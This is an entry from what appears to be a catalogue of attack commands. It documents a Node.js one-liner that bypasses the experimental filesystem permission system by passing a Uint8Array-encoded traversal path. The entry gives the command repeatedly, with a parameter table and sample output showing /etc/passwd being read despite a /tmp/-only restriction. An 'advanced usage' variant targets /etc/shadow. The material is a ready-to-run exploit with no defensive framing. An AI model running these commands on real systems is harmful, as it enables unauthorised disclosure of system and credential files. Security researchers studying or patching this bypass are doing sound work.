---
id: cmd-node-fs-uint8array
data: >-
  node --experimental-permission --allow-fs-read=/tmp/ -p 'fs.readFileSync(new
  TextEncoder().encode("/tmp/../etc/passwd"))'
tags:
  - path-traversal
  - node-js
type: command
output: >-
  <Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f
  62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a
  4e ... 2103 more bytes>
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.635Z'
verified: false
validated: true
submitted: true
---
# node-fs-readfile-uint8array-traversal

## Command

```bash
node --experimental-permission --allow-fs-read=/tmp/ -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
```

## Description

Executes a Node.js expression to demonstrate path traversal in the fs module by reading /etc/passwd using a Uint8Array-encoded path, bypassing restrictions to /tmp/.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--experimental-permission` | Enables Node.js experimental permission system | Yes |
| `--allow-fs-read=/tmp/` | Restricts fs reads to /tmp/ directory | Yes |
| `-p` | Evaluates and prints the JavaScript expression | Yes |
| `fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))` | Reads file synchronously using encoded traversal path | Yes |

## Examples

### Basic Usage

```bash
node --experimental-permission --allow-fs-read=/tmp/ -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
```

### Advanced Usage

To read another file, replace the path: ```bash
node --experimental-permission --allow-fs-read=/tmp/ -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/shadow"))'
```

## Expected Output

Buffer containing /etc/passwd contents, e.g., <Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ...> indicating successful traversal and disclosure.

## Related

- [[procedures/Exploit-Node-js-fs-Path-Traversal-via-Uint8Array]]
